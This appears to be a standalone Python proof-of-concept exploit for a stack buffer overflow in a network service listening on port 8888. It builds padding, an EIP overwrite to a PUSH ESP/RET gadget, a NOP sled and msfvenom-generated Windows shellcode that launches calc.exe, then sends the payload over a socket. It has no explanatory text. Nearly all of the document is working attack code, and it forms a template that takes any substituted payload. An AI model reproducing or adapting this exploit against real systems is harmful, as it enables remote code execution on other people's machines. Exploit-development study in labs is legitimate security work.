import socket

target = "localhost"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
buf =  b""
buf += b"\xb8\xdd\xdf\xea\xd9\xda\xc8\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x1a\xdb\x08"
buf += b"\x2c\x58\x0c\x4e\xcf\xa0\xcd\x2f\x59\x45\xfc\x6f\x3d"
buf += b"\x0e\xaf\x5f\x35\x42\x5c\x2b\x1b\x76\xd7\x59\xb4\x79"
buf += b"\x50\xd7\xe2\xb4\x61\x44\xd6\xd7\xe1\x97\x0b\x37\xdb"
buf += b"\x57\x5e\x36\x1c\x85\x93\x6a\xf5\xc1\x06\x9a\x72\x9f"
buf += b"\x9a\x11\xc8\x31\x9b\xc6\x99\x30\x8a\x59\x91\x6a\x0c"
buf += b"\x58\x76\x07\x05\x42\x9b\x22\xdf\xf9\x6f\xd8\xde\x2b"
buf += b"\xbe\x21\x4c\x12\x0e\xd0\x8c\x53\xa9\x0b\xfb\xad\xc9"
buf += b"\xb6\xfc\x6a\xb3\x6c\x88\x68\x13\xe6\x2a\x54\xa5\x2b"
buf += b"\xac\x1f\xa9\x80\xba\x47\xae\x17\x6e\xfc\xca\x9c\x91"
buf += b"\xd2\x5a\xe6\xb5\xf6\x07\xbc\xd4\xaf\xed\x13\xe8\xaf"
buf += b"\x4d\xcb\x4c\xa4\x60\x18\xfd\xe7\xec\xed\xcc\x17\xed"
buf += b"\x79\x46\x64\xdf\x26\xfc\xe2\x53\xae\xda\xf5\x94\x85"
buf += b"\x9b\x69\x6b\x26\xdc\xa0\xa8\x72\x8c\xda\x19\xfb\x47"
buf += b"\x1a\xa5\x2e\xc7\x4a\x09\x81\xa8\x3a\xe9\x71\x41\x50"
buf += b"\xe6\xae\x71\x5b\x2c\xc7\x18\xa6\xa7\xe2\xd6\xa6\x25"
buf += b"\x9b\xe4\xb6\x6a\x70\x60\x50\x06\x96\x24\xcb\xbf\x0f"
buf += b"\x6d\x87\x5e\xcf\xbb\xe2\x61\x5b\x48\x13\x2f\xac\x25"
buf += b"\x07\xd8\x5c\x70\x75\x4f\x62\xae\x11\x13\xf1\x35\xe1"
buf += b"\x5a\xea\xe1\xb6\x0b\xdc\xfb\x52\xa6\x47\x52\x40\x3b"
buf += b"\x11\x9d\xc0\xe0\xe2\x20\xc9\x65\x5e\x07\xd9\xb3\x5f"
buf += b"\x03\x8d\x6b\x36\xdd\x7b\xca\xe0\xaf\xd5\x84\x5f\x66"
buf += b"\xb1\x51\xac\xb9\xc7\x5d\xf9\x4f\x27\xef\x54\x16\x58"
buf += b"\xc0\x30\x9e\x21\x3c\xa1\x61\xf8\x84\xd1\x2b\xa0\xad"
buf += b"\x79\xf2\x31\xec\xe7\x05\xec\x33\x1e\x86\x04\xcc\xe5"
buf += b"\x96\x6d\xc9\xa2\x10\x9e\xa3\xbb\xf4\xa0\x10\xbb\xdc"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))	

buf1 = padding1 + EIP + NOPS + buf + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf1)
except Exception as e:
	print(sys.exc_value)
